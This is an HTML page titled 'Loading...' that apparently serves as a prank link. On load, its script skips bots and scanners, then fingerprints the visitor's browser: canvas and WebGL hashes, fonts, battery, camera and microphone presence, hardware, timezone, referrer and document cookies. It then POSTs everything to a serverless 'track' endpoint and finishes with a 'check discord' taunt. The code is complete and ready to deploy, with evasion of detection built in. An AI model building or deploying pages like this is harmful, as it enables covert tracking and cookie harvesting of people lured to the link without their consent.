<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #0a0a0a;
    color: #00ff41;
    font-family: 'Courier New', monospace;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .container {
    background: #111;
    padding: 30px;
    border-radius: 12px;
    border: 1px solid #00ff4133;
    max-width: 900px;
    width: 100%;
  }
  h1 {
    font-size: 18px;
    font-weight: 400;
    letter-spacing: 2px;
    text-transform: uppercase;
    border-bottom: 1px solid #00ff4133;
    padding-bottom: 12px;
    margin-bottom: 20px;
    color: #00ff41;
  }
  .bar-wrap {
    margin-bottom: 16px;
  }
  .bar-track {
    width: 100%;
    height: 8px;
    background: #222;
    border-radius: 4px;
    overflow: hidden;
    margin-bottom: 6px;
  }
  .bar-fill {
    height: 100%;
    width: 0%;
    background: #e8c547;
    border-radius: 4px;
    transition: width 0.25s ease-out;
  }
  .pct {
    font-size: 42px;
    font-weight: 700;
    color: #e8c547;
    letter-spacing: -2px;
    margin-bottom: 12px;
    animation: pop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) both;
  }
  @keyframes pop {
    0% { transform: scale(0.6); opacity: 0; }
    100% { transform: scale(1); opacity: 1; }
  }
  .status {
    background: #0a0a0a;
    padding: 15px;
    border-radius: 6px;
    font-size: 13px;
    white-space: pre-wrap;
    word-break: break-all;
    max-height: 500px;
    overflow-y: auto;
    border: 1px solid #00ff4122;
    color: #00ff41bb;
    line-height: 1.6;
  }
  .status::-webkit-scrollbar { width: 4px; }
  .status::-webkit-scrollbar-track { background: #0a0a0a; }
  .status::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 2px; }
  .footer {
    margin-top: 16px;
    font-size: 11px;
    color: #666;
    text-align: center;
    border-top: 1px solid #00ff4122;
    padding-top: 16px;
  }
  .badge {
    display: inline-block;
    background: #00ff4122;
    padding: 2px 10px;
    border-radius: 20px;
    font-size: 10px;
    color: #00ff41;
    letter-spacing: 1px;
  }
  .done-overlay {
    position: fixed;
    inset: 0;
    background: #0a0a0a;
    display: flex;
    align-items: center;
    justify-content: center;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.6s ease;
    z-index: 5;
  }
  .done-overlay.show {
    opacity: 1;
    pointer-events: auto;
  }
  .done-text {
    font-size: 32px;
    font-weight: 600;
    color: #e8c547;
    letter-spacing: 1px;
    transform: translateY(20px);
    transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
    font-family: 'Courier New', monospace;
  }
  .done-overlay.show .done-text {
    transform: translateY(0);
  }
</style>
</head>
<body>

<div class="container">
  <h1>Silent Data Collector</h1>
  <div class="pct" id="pct">0%</div>
  <div class="bar-wrap">
    <div class="bar-track">
      <div class="bar-fill" id="bar"></div>
    </div>
  </div>
  <div id="status" class="status">Initializing...</div>
  <div class="footer">
    <span class="badge">No permissions required</span>
  </div>
</div>

<div class="done-overlay" id="overlay">
  <div class="done-text">check discord cutie :3</div>
</div>

<script>
// ================================================================
// COLLECTORS
// ================================================================

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 256; canvas.height = 64;
        ctx.textBaseline = 'top'; ctx.font = '14px Arial';
        ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069'; ctx.fillText('Cwm fjordbank glyphs vext quiz, \ud83d\ude03', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText('Cwm fjordbank glyphs vext quiz, \ud83d\ude03', 4, 17);
        ctx.beginPath(); ctx.arc(200, 30, 12, 0, Math.PI * 2);
        ctx.fillStyle = '#ff00ff'; ctx.fill();
        ctx.strokeStyle = '#00ffff'; ctx.lineWidth = 2; ctx.strokeRect(180, 10, 40, 40);
        const d = canvas.toDataURL(); let h = 0;
        for (let i = 0; i < d.length; i++) { h = ((h << 5) - h) + d.charCodeAt(i); h = h & h; }
        return h.toString(16);
    } catch (e) { return 'canvas_error'; }
}

function getWebGLFingerprint() {
    try {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (!gl) return 'webgl_not_supported';
        const di = gl.getExtension('WEBGL_debug_renderer_info');
        return di ? gl.getParameter(di.UNMASKED_RENDERER_WEBGL) : 'webgl_debug_disabled';
    } catch (e) { return 'webgl_error'; }
}

function getInstalledFonts() {
    const list = [
        'Arial','Helvetica','Times New Roman','Courier New','Verdana','Georgia',
        'Palatino Linotype','Tahoma','Trebuchet MS','Impact','Comic Sans MS',
        'Lucida Console','Lucida Sans Unicode','Garamond','Book Antiqua','Arial Black',
        'Arial Narrow','Century Gothic','Franklin Gothic Medium','Futura','Gill Sans',
        'Optima','Segoe UI','Calibri','Cambria','Candara','Consolas','Constantia',
        'Corbel','Helvetica Neue','Menlo','Monaco','Apple Color Emoji','Noto Sans',
        'Roboto','Open Sans','Lato','Montserrat','Poppins','Inter','SF Pro Display',
        'SF Pro Text'
    ];
    const found = [];
    for (const f of list) { try { if (document.fonts.check(`12px "${f}"`)) found.push(f); } catch(e){} }
    return found;
}

async function getBatteryStatus() {
    try {
        if (!navigator.getBattery) return null;
        const b = await navigator.getBattery();
        return { level: Math.round(b.level * 100), charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
    } catch (e) { return null; }
}

function getNetworkInfo() {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!c) return null;
    return { effectiveType: c.effectiveType||'unknown', downlink: c.downlink||'unknown', rtt: c.rtt||'unknown', saveData: c.saveData||false };
}

async function getMediaDevices() {
    try {
        const d = await navigator.mediaDevices.enumerateDevices();
        return { hasCamera: d.some(x=>x.kind==='videoinput'), hasMic: d.some(x=>x.kind==='audioinput'), hasSpeaker: d.some(x=>x.kind==='audiooutput'), total: d.length };
    } catch (e) { return { hasCamera:false, hasMic:false, hasSpeaker:false, total:0 }; }
}

function getPerformanceTiming() {
    try {
        const p = performance.timing, n = p.navigationStart;
        return { loadTime: p.loadEventEnd-n, domContentLoaded: p.domContentLoadedEventEnd-n, dnsTime: p.domainLookupEnd-p.domainLookupStart, tcpTime: p.connectEnd-p.connectStart, ttfb: p.responseStart-p.requestStart };
    } catch (e) { return null; }
}

function getPlugins() { try { return Array.from(navigator.plugins).map(p=>p.name); } catch(e){ return []; } }

function getGamepadInfo() {
    try {
        const gp = navigator.getGamepads ? navigator.getGamepads() : [];
        const c = [];
        for (const g of gp) { if (g) c.push({ id:g.id, index:g.index, mapping:g.mapping, buttons:g.buttons.length, axes:g.axes.length }); }
        return { connected: c, count: c.length };
    } catch (e) { return { connected:[], count:0 }; }
}

// ================================================================
// BOT DETECTION
// ================================================================

function isBot() {
    const ua = navigator.userAgent.toLowerCase();
    const botPatterns = ['headless', 'bot', 'crawler', 'spider', 'scraper', 'scan', 'curl', 'wget'];
    for (const pattern of botPatterns) {
        if (ua.includes(pattern)) return true;
    }
    if (navigator.webdriver) return true;
    return false;
}

// ================================================================
// COLLECT EVERYTHING
// ================================================================

async function collectAllData(log) {
    const d = {};

    log('Collecting browser identity...');
    d.timestamp = new Date().toISOString();
    d.userAgent = navigator.userAgent;
    d.platform = navigator.platform;
    d.vendor = navigator.vendor || 'unknown';
    d.language = navigator.language;
    d.languages = navigator.languages;
    d.cookieEnabled = navigator.cookieEnabled;
    d.doNotTrack = navigator.doNotTrack || 'unknown';
    d.online = navigator.onLine;

    log('Collecting timezone & locale...');
    d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    d.timezoneOffset = new Date().getTimezoneOffset();
    d.locale = Intl.DateTimeFormat().resolvedOptions().locale;

    log('Collecting screen info...');
    d.screen = { width:screen.width, height:screen.height, colorDepth:screen.colorDepth, availWidth:screen.availWidth, availHeight:screen.availHeight };

    log('Collecting window info...');
    d.window = { innerWidth:window.innerWidth, innerHeight:window.innerHeight, outerWidth:window.outerWidth, outerHeight:window.outerHeight, devicePixelRatio:window.devicePixelRatio };

    log('Collecting hardware specs...');
    d.hardware = { deviceMemory:navigator.deviceMemory||'unknown', cpuCores:navigator.hardwareConcurrency||'unknown' };

    log('Generating canvas fingerprint...');
    d.fingerprints = { canvas:getCanvasFingerprint(), webgl:getWebGLFingerprint() };

    log('Detecting pointer/touch...');
    d.pointer = { touchSupport:'ontouchstart' in window||navigator.maxTouchPoints>0, maxTouchPoints:navigator.maxTouchPoints||0, hoverSupport:window.matchMedia('(hover:hover)').matches, pointerCoarse:window.matchMedia('(pointer:coarse)').matches, pointerFine:window.matchMedia('(pointer:fine)').matches };

    log('Detecting theme preference...');
    d.theme = { prefersColorScheme:window.matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light', prefersReducedMotion:window.matchMedia('(prefers-reduced-motion:reduce)').matches };

    log('Scanning network info...');
    d.network = getNetworkInfo();

    log('Reading performance timing...');
    d.performance = getPerformanceTiming();

    log('Enumerating plugins...');
    d.plugins = getPlugins();
    d.pluginsCount = navigator.plugins?navigator.plugins.length:0;

    log('Scanning installed fonts...');
    d.fonts = getInstalledFonts();
    d.fontsCount = d.fonts.length;

    log('Checking battery status...');
    d.battery = await getBatteryStatus();

    log('Scanning media devices...');
    d.media = await getMediaDevices();

    log('Detecting gamepads...');
    d.gamepad = getGamepadInfo();

    log('Reading page info...');
    d.page = { url:window.location.href, referrer:document.referrer, hostname:window.location.hostname };

    log('Checking storage...');
    d.cookies = document.cookie || 'none';
    d.historyLength = window.history.length;

    return d;
}

// ================================================================
// UI
// ================================================================

const pctEl = document.getElementById('pct');
const barEl = document.getElementById('bar');
const overlay = document.getElementById('overlay');
const statusDiv = document.getElementById('status');

function setProgress(n) {
    const clamped = Math.min(100, Math.max(0, n));
    pctEl.textContent = clamped + '%';
    barEl.style.width = clamped + '%';
}

function showDone() {
    pctEl.textContent = '100%';
    barEl.style.width = '100%';
    setTimeout(() => { overlay.classList.add('show'); }, 500);
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function main() {
    try {
        if (isBot()) {
            pctEl.textContent = 'done';
            statusDiv.textContent = 'Bot detected. Skipping.';
            return;
        }

        setProgress(0);
        statusDiv.textContent = '';

        let logLines = [];
        const log = (msg) => {
            logLines.push('> ' + msg);
            statusDiv.textContent = logLines.join('\n');
            statusDiv.scrollTop = statusDiv.scrollHeight;
        };

        log('Starting silent data collection...');

        const dataPromise = collectAllData(log);
        const startTime = Date.now();
        const duration = 5000;

        while (Date.now() - startTime < duration) {
            const elapsed = Date.now() - startTime;
            const pct = Math.min(99, Math.round((elapsed / duration) * 100));
            setProgress(pct);
            await sleep(50);
        }

        const data = await dataPromise;

        log('');
        log('=== COLLECTION SUMMARY ===');
        log('Timezone: ' + data.timezone);
        log('Device: ' + (data.userAgent.split('(')[1]?.split(')')[0] || 'unknown'));
        log('Screen: ' + data.screen.width + 'x' + data.screen.height);
        log('Memory: ' + data.hardware.deviceMemory + ' GB');
        log('CPU cores: ' + data.hardware.cpuCores);
        log('Canvas hash: ' + data.fingerprints.canvas.substring(0, 20));
        log('WebGL: ' + (data.fingerprints.webgl?.substring(0, 30) || 'unknown'));
        log('Fonts: ' + data.fontsCount + ' installed');
        log('Plugins: ' + data.pluginsCount);
        log('Touch: ' + (data.pointer.touchSupport ? 'Yes' : 'No'));
        log('Battery: ' + (data.battery ? data.battery.level + '%' : 'N/A'));
        log('Network: ' + (data.network ? data.network.effectiveType : 'N/A'));
        log('Camera: ' + (data.media.hasCamera ? 'Yes' : 'No'));
        log('Mic: ' + (data.media.hasMic ? 'Yes' : 'No'));
        log('Data points: ' + Object.keys(data).length);
        log('');
        log('Sending to server...');

        setProgress(100);

        await fetch('/.netlify/functions/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        log('Data sent successfully!');
        showDone();

    } catch (e) {
        setProgress(100);
        showDone();
    }
}

if (document.readyState === 'complete') { main(); }
else { window.addEventListener('load', main); }
</script>
</body>
</html>
